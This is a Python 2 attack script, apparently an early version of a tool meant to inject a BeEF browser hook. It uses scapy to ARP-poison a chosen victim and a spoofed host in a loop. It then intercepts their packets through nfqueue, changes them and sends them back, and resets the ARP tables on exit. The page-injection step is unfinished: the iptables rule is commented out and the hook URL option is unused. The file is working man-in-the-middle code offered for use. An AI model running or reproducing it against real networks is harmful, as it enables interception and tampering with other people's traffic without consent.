

from os import geteuid, system
from sys import argv
from time import sleep
from scapy.all import *
import nfqueue, socket, threading, asyncore

class Spoof():
	def get_mac(self,ip):
		ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=5)
		for snd,rcv in ans:
			return rcv.sprintf("%Ether.src%")

	def reset(self,spoofed_ip,spoofed_mac,victim_ip,victim_mac):
		send(ARP(psrc=spoofed_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff", hwsrc=spoofed_mac))
		send(ARP(psrc=victim_ip, pdst=spoofed_ip, hwdst="ff:ff:ff:ff:ff", hwsrc=victim_mac))
		return

	def poison(self,spoofed_ip,spoofed_mac,victim_ip,victim_mac):
		send(ARP(psrc=spoofed_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff"))
		send(ARP(psrc=victim_ip, pdst=spoofed_ip, hwdst="ff:ff:ff:ff:ff:ff"))				
		return			

class Own():
	def handler(self, i, payload):
		packet = IP(payload.get_data())
		#modify packet
		packet.ttl = 10
		#reinject packet
		del(packet.chksum)
		print packet
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(packet), len(packet))
		return
		
class PcapQueue(asyncore.file_dispatcher):
	def __init__(self):
		print '[*] queue started.. waiting for data'
		self._q = nfqueue.queue()
		self._q.set_callback(Own().handler)
		self._q.fast_open(0, socket.AF_INET)
		self._q.set_queue_maxlen(5000)
		self.fd = self._q.get_fd()
		asyncore.file_dispatcher.__init__(self, self.fd, None)
		self._q.set_mode(nfqueue.NFQNL_COPY_PACKET)
	def handle_read(self):
		self._q.process_pending(10)
  	def writable(self):
		return False

		
#def iptablePrep():
#	os.system('/sbin/iptables -A INPUT -p tcp --dport 80 -j QUEUE')
#	return
			
def main():
	print """----------------------\ng0t BeEF?\nLevel@coresecurity.com\nBeta\n----------------------\n """
	if geteuid() != 0:
		print "[*] use root"
		exit(1)	
#       	try:
#               	iptablePrep()
#       	except:
#               	print '[*] couldnt set iptables'
#               	exit(1)

	from optparse import OptionParser
	parser = OptionParser()
	parser.add_option("--getmac",dest="ipAddr",help="Get MAC for IP")
	parser.add_option("--spoofip",dest="spoofed_ip",help="IP address to Spoof")
	parser.add_option("--victimip",dest="victim_ip",help="IP address to Attack")
	parser.add_option("--url",dest="url",help="BeEF JS Hook URL")
	(o, a) = parser.parse_args()
	
	if (o.ipAddr != None):
		print "[*] MAC Address: %s" % Spoof().get_mac(o.ipAddr)
		exit(0)
	
	if (o.spoofed_ip != None and o.victim_ip != None):
		spoofed_mac = Spoof().get_mac(o.spoofed_ip)
		victim_mac = Spoof().get_mac(o.victim_ip)
		print "[*] Spoofed IP %s\n[*] Spoofed MAC %s\n[*] Victim IP %s\n[*] Victim MAC %s\n[*] Spoofing.." % (o.spoofed_ip,spoofed_mac,o.victim_ip,victim_mac)
		PcapQueue()
		threading.Thread(target=asyncore.loop, name="nfqueue-parent").start()
		while True:
			try:
				threading.Thread(target=Spoof().poison, args=(o.spoofed_ip,spoofed_mac,o.victim_ip,victim_mac), name="arp-spoof").start()
				sleep(5)
			except KeyboardInterrupt:
				print "[*] killing threads..."
				for thread in threading.enumerate():
					if thread.isAlive():
						try:
							thread._Thread__stop()
						except:
							print '[*] ' + str(thread.getName()) + ' could not be terminated'

				print "[*] fixing ARP tables.."
				Spoof().reset(o.spoofed_ip,spoofed_mac,o.victim_ip,victim_mac)
				exit(0)

	else:
		exit(1)

if __name__=="__main__":
	main()
